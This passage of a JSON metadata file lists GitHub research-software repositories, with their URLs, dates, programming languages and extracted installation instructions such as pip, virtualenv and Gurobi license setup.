        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/euro-hpc-pl/omnisolver-bruteforce",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Currently, the `omnisolver-bruteforce` package requires working CUDA installation.\n\nTo install the plugin first set the `CUDAHOME` environmental library to your CUDA instalaltion location, e.g.:\n\n```shell\n# Rmember, your actual location  may vary!\nexport CUDAHOME=/usr/local/cuda\n```\n\nand then run:\n\n```shell\npip install omnisolver-bruteforce\n```\n\n> **Warning**\n> If you don't set the `CUDAHOME` directory, an attempt will be made to deduce it based on the location of your `nvcc` compiler.\n> However, this process might not work in all the cases and should not be relied on.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/euro-hpc-pl/omnisolver-bruteforce/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "*Bruteforce (a.k.a. exhaustive search) Plugin for * \n"
                },
                "confidence": 0.9606071145418099,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/euro-hpc-pl/omnisolver-bruteforce/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-09-24T07:45:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-03-13T14:45:10Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Cuda",
                    "name": "Cuda",
                    "type": "Programming_language",
                    "size": 10734
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 10178
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 1537
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Cython",
                    "name": "Cython",
                    "type": "Programming_language",
                    "size": 780
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "616": {
        "filename": "antoineBarbez_SMAD_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/antoineBarbez/SMAD",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "This code has been tested under Python 2.7.16, and the following steps assume you have already installed Python 2.7 on your machine.\n1. **Create a Python 2.7 virtual environment:**\nTo be able to run the code you should preferably setup this repository within a virtual environment. The command below uses [virtualenvwrapper](https://virtualenvwrapper.readthedocs.io/en/latest/) to do so.\n```\nmkvirtualenv --python=/usr/bin/python2.7 smad\nworkon smad\n```\n2. **Add the root of the repository to your PYTHONPATH:**\n```\nexport PYTHONPATH=\"$PYTHONPATH:PATH_TO_SMAD_DIRECTORY\"\n```\n3. **Install requirements:**\n```\npip install -r requirements.txt\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Setup",
                    "parent_header": [
                        "SMAD (SMart Aggregation of Anti-patterns Detectors)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/antoineBarbez/SMAD/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-10-11T22:20:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-08-01T02:06:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 93552
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 43830
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "617": {
        "filename": "tatisKit_AutoWIG_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/StatisKit/AutoWIG",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2015-01-16T14:14:53Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-21T11:06:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 337632
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 7100
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 3937
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "618": {
        "filename": "Learner0x5a_kTrans-release_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Learner0x5a/kTrans-release",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-08-24T08:44:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-01T02:19:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 63902
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "619": {
        "filename": "monperrus_replication-package-exhaustive-systematic-review-rickrolling_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASSERT-KTH/rickrolling",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-03-11T14:04:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-11-22T13:30:59Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "620": {
        "filename": "bineet-coderep_MoULDyS_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/bineet-coderep/MoULDyS",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "# `MoULDyS` Installation Guide\n\n**The tool requires a Linux environment**. \n\n`MoULDyS` can be used in the following two ways:\n\n1. **Virtual Machine Image (Recommended)**. This is the simplest way to use `MoULDyS`, which does not necessitate the installation of any dependencies or code downloading. Nevertheless, it is required to acquire and install the [Gurobi](https://www.gurobi.com/solutions/gurobi-optimizer/?campaignid=193283256&adgroupid=138872523040&creative=596136082776&keyword=gurobi&matchtype=e&gclid=CjwKCAjw6IiiBhAOEiwALNqncXIGRe-OYdzuBIwq3Waarc4fe6rP6DRYPh1xTWfA86OQSH_oX5zbdRoC7IUQAvD_BwE) license. Users can recreate the results easily using this method. This also requires [VirtualBox](https://www.virtualbox.org/) installed on the user's machine. The `MoULDyS` virtual machine (VM) image can be downloaded from [here](https://drive.google.com/drive/folders/1hARp49PkvRXrHY2fU63NsQ-x0A4yZqVm?usp=share_link).\n2. **Install `MoULDyS` on Local Machine**. This option requires installation of the tool from scratch. \n\n## **Virtual Machine Image (Recommended)**\n\n1. If [VirtualBox](https://www.virtualbox.org/) is not already installed, please install the appropriate platform package from [here](https://www.virtualbox.org/wiki/Downloads).\n\n2. Once the VirtualBox is installed, the VM image of `MoULDyS` can be downloaded from [here](https://drive.google.com/drive/folders/1hARp49PkvRXrHY2fU63NsQ-x0A4yZqVm?usp=share_link) (this folder contains the VM of `MoULDyS` as `.ova` file, and a `README` document). Once downloaded, the image must be loaded in the VirtualBox. It should startup a Ubuntu virtual machine (VM), which comes preloaded with `MoULDyS`.\n\n3. Once the Ubuntu VM is started, please login to the `admin` account using password `mouldys123`. `MoULDyS` is located in the folder `~/MoULDyS/`. One can navigate to the folder using:\n\n   * ```shell\n     cd /home/admin/MoULDyS/\n     ```\n\n4. Please be advised that we are presently offering a license, thus omitting this step is feasible. Nonetheless, this arrangement might be terminated in the near future, and we strongly recommend users to proceed to the next step and verify if the license is activated. In case it is not, kindly ensure to carry out this step.\n\n   1. Once logged in, please obtain appropriate Gurobi License from [here](http://www.gurobi.com/downloads/licenses/license-center). After the license is installed properly, Gurobi can be used from home network.\n\n   2. Though one should use a license that is appropriate for them and their organization, it is worth point out that Gurobi offers free academic licenses. Here, we mention the steps to obtain a free a license. Obtain your free license by following the instructions [here](https://www.gurobi.com/academia/academic-program-and-licenses/) (please select `Individual Academic Licenses`). The license can be installed as follows (**note: must be in your university network, or in VPN**):\n\n      * ```shell\n        grbgetkey <your-license-key>\n        ```\n\n      * **Note:** Gurobi doesn't allow the same license to be used on two different computers. Please see the details [here](https://www.gurobi.com/downloads/end-user-license-agreement-academic/) (especially if you want to use it on two different computers).\n\n5. We have provided a testing script, [`testInstall.py`](https://github.com/bineet-coderep/MoULDyS/blob/main/env_test/testInstall.py), in the folder [`/my/location/MoULDyS/env_test/`](https://github.com/bineet-coderep/MoULDyS/tree/main/env_test) to check if the environment is ready. To perform the testing, please follow the following steps.\n\n   1. One can simply test if their environment is ready by running the following script:\n\n      * ```shell\n        python /home/admin/MoULDyS/env_test/testInstall.py\n        ```\n\n   2. If the following output message displays in the console (in cyan color), the environment is ready:\n\n      * ```shell\n        =======================\n        Environment is Ready!\n        =======================\n        ```\n\n      * Following is a screenshot displaying a ready environment: Look for \"Environment is Ready!\" in cyan.\n\n        * ![test_env_op](test_env_op.png)\n\n   3. If any other error message pops up, the environment is most likely not ready.\n\n6. One can now recreate the results following the instructions in [`documentation/recreate_results.md`](https://github.com/bineet-coderep/MoULDyS/blob/main/documentation/recreate_results.md).\n\n## Install `MoULDyS` on Local Machine\n\n`MoULDyS` can be installed on a local machine by performing the following steps\n\n### Install Dependencies\n\nOne needs to install the following dependencies first. The `debian` package names are provided in brackets.\n\n- [`Python 3.7.x`](https://www.python.org/).\n\n- [`NumPy`](https://numpy.org/)([`python-numpy`](https://packages.debian.org/search?keywords=python-numpy)).\n\n- [`SciPy`](https://scipy.org/)([`python-scipy`](https://packages.debian.org/search?keywords=python-scipy)).\n\n- [`mpmath`](https://mpmath.org/)([`python3-mpmath`](https://packages.debian.org/search?keywords=python3-mpmath)).\n\n- [`pandas`](https://pandas.pydata.org/)([`python-pandas`](https://packages.debian.org/search?suite=default&section=all&arch=any&searchon=names&keywords=python-pandas)).\n\n- Gurobi Python Interface:\n  1. Install Gurobi. Please note that we will need Gurobi Python Interface. On-line documentation on installation can be found [here](https://www.gurobi.com/documentation/9.5/quickstart_linux/cs_using_pip_to_install_gr.html). \n\n     1. **[If you are NOT a `conda` user]** One can use `pip` to install Gurobi Python interface as follows:\n\n        * ```shell\n          python -m pip install gurobipy\n          ```\n\n        * Make sure to have upgraded `numpy`. If not already done, one can issue the following command:\n\n           * ```shell\n             pip install --upgrade numpy\n             ```\n\n        * if using `pip`, one has to install `grbgetkey` manually (see [here](https://support.gurobi.com/hc/en-us/articles/360059842732)).\n\n     2. **[If you are a `conda` user]** Gurobi Python Interface can also be installed through [Anaconda](https://www.anaconda.com/). Details on installing Gurobi Python Interface through `conda` can be found [here](https://www.gurobi.com/documentation/9.5/quickstart_mac/cs_anaconda_and_grb_conda_.html). One can use the following steps to install:\n\n        1. ```shell\n           conda config --add channels https://conda.anaconda.org/gurobi\n           ```\n\n        2. ```shell\n           conda install gurobi\n           ```\n\n  2. Please obtain appropriate Gurobi License from [here](http://www.gurobi.com/downloads/licenses/license-center). After the license is installed properly, Gurobi can be used from home network.\n\n     * Though one should use a license that is appropriate for them and their organization, it is worth point out that Gurobi offers free academic licenses. Here, we mention the steps to obtain a free a license. Obtain your free license by following the instructions [here](https://www.gurobi.com/academia/academic-program-and-licenses/) (please select `Individual Academic Licenses`). The license can be installed as follows (**note: must be in your university network, or in VPN**):\n\n       * ```shell\n         grbgetkey <your-license-key>\n         ```\n\n       * **Note:** Gurobi doesn't allow the same license to be used on two different computers. Please see the details [here](https://www.gurobi.com/downloads/end-user-license-agreement-academic/) (especially if you want to use it on two different computers).\n\n### Downloading and Setting-Up `MoULDyS`\n\n1. Download the repository to your desired location `/my/location/`:\n\n   * ```shell\n     git clone https://github.com/bineet-coderep/MoULDyS.git\n     ```\n\n2. Once the repository is downloaded, please perform the following steps:\n\n   1. Open `~/.bashrc` using your choice of editor (say, `vi`):\n\n     * ```shell\n       vi ~/.baschrc\n       ```\n\n   2. Once `.bashrc` is opened, please add the location of the tool to a path variable `MNTR_ROOT_DIR` (This step is crucial to run the tool):\n\n     * ```shell\n       export MNTR_ROOT_DIR=/my/location/MoULDyS/\n       ```\n\n### Testing The Environment (Optional)\n\nWe have provided a testing script, [`testInstall.py`](https://github.com/bineet-coderep/MoULDyS/blob/main/env_test/testInstall.py), in the folder [`/my/location/MoULDyS/env_test/`](https://github.com/bineet-coderep/MoULDyS/tree/main/env_test) to check if the environment is ready. To perform the testing, please follow the following steps.\n\n1. One can simply test if their environment is ready by running the following script:\n\n   * ```shell\n     python /my/location/MoULDyS/env_test/testInstall.py\n     ```\n\n2. If the following output message displays in the console (in cyan color), the environment is ready:\n\n   * ```shell\n     =======================\n     Environment is Ready!\n     =======================\n     ```\n\n   * Following is a screenshot displaying a ready environment: Look for \"Environment is Ready!\" in cyan.\n\n     * ![test_env_op](test_env_op.png)\n\n3. If any other error message pops up, the environment is most likely not ready.\n\n## Development Environment Details (Optional)\n\nFollowing environment has been used for development and testing `MoULDyS`.\n\n### System Details of The Development Environment \n\n* OS Name: `Ubuntu 20.04.4 LTS`.\n* OS Type: `64 bit`.\n* GNOME Version: `3.36.8`.\n* Windowing System: `X11`.\n\n### Hardware Details of The Development Environment \n\n* Model: Alienware Area 51m R2.\n* Processor: `Intel\u00ae Core\u2122 i7-10700 CPU @ 2.90GHz \u00d7 16 `.\n* Memory: `31.1 GiB`.\n* Graphics: `NVIDIA RTX 2070 Super 8GB GDDR6 Dual `.\n* Disk Capacity: `4.0 TB`.\n\nNote: This is just the development platform, not a requirement for the tool to work.\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/bineet-coderep/MoULDyS/main/documentation/installation_guide.md"
            },
            {
                "result": {
                    "value": "A detailed installation guide is provided in [`/documentation/installation_guide.md`](https://github.com/bineet-coderep/MoULDyS/blob/main/documentation/installation_guide.md).\n\n`MoULDyS` can be used in the following two ways:\n\n1. **Virtual Machine Image (Recommended)**. This is the simplest way to use `MoULDyS`, which does not necessitate the installation of any dependencies or code downloading. Nevertheless, it is required to acquire and install the [Gurobi](https://www.gurobi.com/solutions/gurobi-optimizer/?campaignid=193283256&adgroupid=138872523040&creative=596136082776&keyword=gurobi&matchtype=e&gclid=CjwKCAjw6IiiBhAOEiwALNqncXIGRe-OYdzuBIwq3Waarc4fe6rP6DRYPh1xTWfA86OQSH_oX5zbdRoC7IUQAvD_BwE) license. Users can recreate the results easily using this method. This also requires [VirtualBox](https://www.virtualbox.org/) installed on the user's machine. The `MoULDyS` virtual machine (VM) image can be downloaded from [here](https://drive.google.com/drive/folders/1hARp49PkvRXrHY2fU63NsQ-x0A4yZqVm?usp=share_link).\n2. **Install `MoULDyS` on Local Machine**. This option requires installation of the tool from scratch. \n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "`MoULDyS`: A Monitoring Tool for Autonomous Systems"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/bineet-coderep/MoULDyS/main/README.md"
            },
            {
                "result": {
                    "value": "This is the simplest way to use `MoULDyS`, which does not necessitate the installation of any dependencies or code downloading. Nevertheless, it is required to acquire and install the [Gurobi](https://www.gurobi.com/solutions/gurobi-optimizer/?campaignid=193283256&adgroupid=138872523040&creative=596136082776&keyword=gurobi&matchtype=e&gclid=CjwKCAjw6IiiBhAOEiwALNqncXIGRe-OYdzuBIwq3Waarc4fe6rP6DRYPh1xTWfA86OQSH_oX5zbdRoC7IUQAvD_BwE) license. Users can recreate the results easily using this method. This also requires [VirtualBox](https://www.virtualbox.org/) installed on the user's machine. The `MoULDyS` virtual machine (VM) can be downloaded from [here](https://drive.google.com/drive/folders/1hARp49PkvRXrHY2fU63NsQ-x0A4yZqVm?usp=share_link).\n",
                    "type": "Text_excerpt",
                    "original_header": "Virtual Machine Image (Recommended)",
                    "parent_header": [
                        "`MoULDyS`: A Monitoring Tool for Autonomous Systems",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/bineet-coderep/MoULDyS/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Once `MoULDyS` is installed following either of the two ways, the steps provided in the [`/docuementation/user_guide.md`](https://github.com/bineet-coderep/MoULDyS/blob/main/documentation/user_guide.md) should run without any error. \n",
                    "original_header": "Using The Tool `MoULDyS`"
                },
                "confidence": 0.9993363264885142,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bineet-coderep/MoULDyS/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-04-12T17:59:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-04-12T18:02:40Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 3273910
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1718877
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 907
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 818
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 645
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 611
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "621": {
        "filename": "mehdigolzadeh_BoDeGiC_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mehdigolzadeh/BoDeGiC",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "To install BoDeGiC, run the following command:\n```\npip install git+https://github.com/mehdigolzadeh/BoDeGiC\n```\nGiven that this tool has many dependencies, and in order not to conflict with already installed packages, it is recommended to use a virtual environment before its installation. You can install and create a _Python virtual environment_ and then install and run the tool in this environment. You can use any virtual environment of your choice. Below are the steps to install and create a virtual environment with **virtualenv**.\n\nUse the following command to install the virtual environment:\n```\npip install virtualenv\n```\nCreate a virtual environment in the folder where you want to place your files:\n```\nvirtualenv <name>\n```\nStart using the environmnet by:\n```\nsource <name>/bin/activate\n```\nAfter running this command your command line prompt will change to `(<name>) ...` and now you can install BoDeGiC with the pip command.\nWhen you are finished running the tool, you can quit the environment by:\n```\ndeactivate\n```\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "BoDeGiC"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/mehdigolzadeh/BoDeGiC/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-10-10T01:22:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-29T11:37:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 15619
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "622": {
        "filename": "qibinhang_SeaM_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/qibinhang/SeaM",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-12-14T02:51:10Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-11T07:21:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 184060
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "623": {
        "filename": "EhsanMashhadi_ISSRE2023-BugSeverityPrediction_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/EhsanMashhadi/ISSRE2023-BugSeverityPrediction",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "For Getting Started:\n- Operating System: The provided artifact is tested on Linux (20.04.6 LTS) and macOS (Ventura 13.5).\n- GPU: It is better to have a GPU for running experiments on GPU otherwise it may take a long time.\n- CPU/RAM: There is no strict minimum on these.\n- Python: Python 3 is required.\n",
                    "type": "Text_excerpt",
                    "original_header": "Environment Setup:",
                    "parent_header": [
                        "BugSeverityPrediction"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/EhsanMashhadi/ISSRE2023-BugSeverityPrediction/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. Clone the repository\n   - `git@github.com:EhsanMashhadi/ISSRE2023-BugSeverityPrediction.git` \n2. Install dependencies (You may need to change the torch version for running on your GPU/CPU) \n- **Experiments**:\n  -  It is better to install these dependencies on a virtual env (you can also use requirements.txt)\n  - `pip install pandas==1.4.2`\n  - `pip install jira`\n  - `pip install beautifulsoup4`\n  - `pip install lxml`\n  - `pip install transformers==4.18.0`\n  -  `pip install torch==1.11.0` This should be enough for running on CPU, but install the next for running on GPU\n  - `pip install torch==1.11.0+cu113 torchvision==0.12.0+cu113 -f https://download.pytorch.org/whl/torch_stable.html`\n  - `pip install scikit-learn==1.1.1`\n  - `pip install xgboost==1.6.1`\n  - `pip install seaborn==0.11.2`\n  \n3. Adding the project root folder to the `PYTHONPATH`\n  - `export PYTHONPATH=$PYTHONPATH:*/rootpath/you/clone/the/project*/experiments`\n  - e.g., `export PYTHONPATH=$PYTHONPATH:/Users/ehsan/workspace/ISSRE2023-BugSeverityPrediction/experiments`\n4. Running data preprocessing\n   - `cd ISSRE2023-BugSeverityPrediction/experiments/data`\n   - `bash preprocessing.sh`\n   - Copy generated `jsonl` and `csv` files into the dataset folder\n \n",
                    "original_header": "Reproducibility Instructions:"
                },
                "confidence": 0.9999999999999858,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/EhsanMashhadi/ISSRE2023-BugSeverityPrediction/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The tools below should be installed and configured correctly, otherwise, this step won't work. It may take a long time to do this step and can be skipped (recommended). \n  - Java: Java 18 is required (**only for running data gathering step**).\n  - Git: (brew, apt, ... based on your OS)\n  - SVN: (brew, apt, ... based on your OS)\n  - [Defects4J](https://github.com/rjust/defects4j) (Follow all the steps in the provided installation guide).\n  - [Bugs.jar](https://github.com/bugs-dot-jar/bugs-dot-jar) (You must install this in the `data_gathering` directory). \n1. `cd ISSRE2023-BugSeverityPrediction/data_gathering/issue_scraper`\n2. `python main.py` \nFor the below steps, it can be easier to use `gradlew`or simply open by IntelliJ IDEA to run Java files \n3. `cd ISSRE2023-BugSeverityPrediction/data_gathering/MetricsExtractor/src/main/java/software/ehsan/severityprediction/method_extractor` \n5. `cd ISSRE2023-BugSeverityPrediction/data_gathering/MetricsExtractor/src/main/java/software/ehsan/severityprediction/metric_extractor` \n",
                    "original_header": "How to re-run the data gathering step  (out of paper scope)?"
                },
                "confidence": 0.9791413617845529,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/EhsanMashhadi/ISSRE2023-BugSeverityPrediction/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-08-20T23:33:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-22T05:14:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 78782
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 54793
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1191
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "624": {
        "filename": "sakshiudeshi_Astraea_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sakshiudeshi/Astraea",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Please see the respective pages for detailed installation instructions.  \n",
                    "original_header": "Coreference Resolution"
                },
                "confidence": 0.9968020491991986,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sakshiudeshi/Astraea/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Please refer to the specific page for installation instructions.  \n",
                    "original_header": "Sentiment Analysis"
                },
                "confidence": 0.9805956392081369,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sakshiudeshi/Astraea/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-09-07T06:20:10Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-01T01:39:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 30468843
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 64908
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "625": {
        "filename": "alipay_microservice_system_twin_graph_based_anomaly_detection_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/alipay/microservice_system_twin_graph_based_anomaly_detection",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The repository has some important dependencies below \n* Ubuntu 18.04\n* Python 3.8\n* Pytorch 1.12.0\n* Pytorch_geometric == 2.2.0 \nInstall other dependencies can be installed by: \n    pip install -r requirements.txt\n \n",
                    "original_header": "Environment"
                },
                "confidence": 0.998643842376097,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/alipay/microservice_system_twin_graph_based_anomaly_detection/main/readme.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-08-30T05:54:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-18T06:18:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 59335
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "626": {
        "filename": "JLiangWaterloo_fmeasy_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/JLiangWaterloo/fmeasy",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2015-04-21T00:28:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
